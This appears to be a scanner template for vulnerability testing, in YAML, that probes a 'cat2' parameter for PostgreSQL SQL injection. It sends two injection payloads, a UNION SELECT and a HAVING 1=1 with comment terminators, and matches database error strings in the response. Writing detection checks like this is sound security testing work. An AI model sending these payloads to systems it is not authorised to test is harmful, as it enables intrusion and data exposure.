id: sqli6-pg-14
name: 'SQLi pg probe in cat2'
severity: high
type: active
tags:
  - sqli
  - injection
  - pg
description: 'Triggers pg error via cat2'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      cat2:
        - ''') UNION SELECT 1,2--'
        - ''' HAVING 1=1--'
    matchers:
      - type: regex
        part: body
        regex:
          - 'PostgreSQL'
          - 'pg_query'
